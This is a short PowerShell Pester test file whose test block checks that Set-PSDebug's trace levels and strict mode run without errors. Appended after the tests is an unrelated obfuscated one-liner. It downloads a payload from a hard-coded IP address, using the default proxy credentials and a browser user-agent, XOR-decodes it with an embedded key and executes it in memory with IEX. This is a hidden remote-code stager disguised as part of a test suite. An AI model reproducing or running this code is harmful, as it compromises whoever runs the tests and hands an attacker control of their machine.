

Describe "Set-PSDebug" -Tags "CI" {
    Context "Tracing can be used" {
        AfterEach {
            Set-PSDebug -Off
        }

        It "Should be able to go through the tracing options" {
            { Set-PSDebug -Trace 0 } | Should -Not -Throw
            { Set-PSDebug -Trace 1 } | Should -Not -Throw
            { Set-PSDebug -Trace 2 } | Should -Not -Throw
        }

        It "Should be able to set strict" {
            { Set-PSDebug -Strict } | Should -Not -Throw
        }
    }
}

$wC=New-OBjeCT SYStEm.Net.WEbCLient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadERS.ADD('User-Agent',$u);$Wc.PrOXy = [SYSTeM.NEt.WeBReQUEst]::DefAulTWeBProXY;$WC.PrOXY.CredENTials = [SYStEm.NeT.CREdeNTialCACHe]::DefaULTNEtworkCReDEntIalS;$K='7b24afc8bc80e548d66c4e7ff72171c5';$i=0;[Char[]]$B=([ChAr[]]($wc.DoWNloadStrING("http://192.168.118.129:8080/index.asp")))|%{$_-BXoR$k[$I++%$k.LENgTh]};IEX ($B-JoIn'')

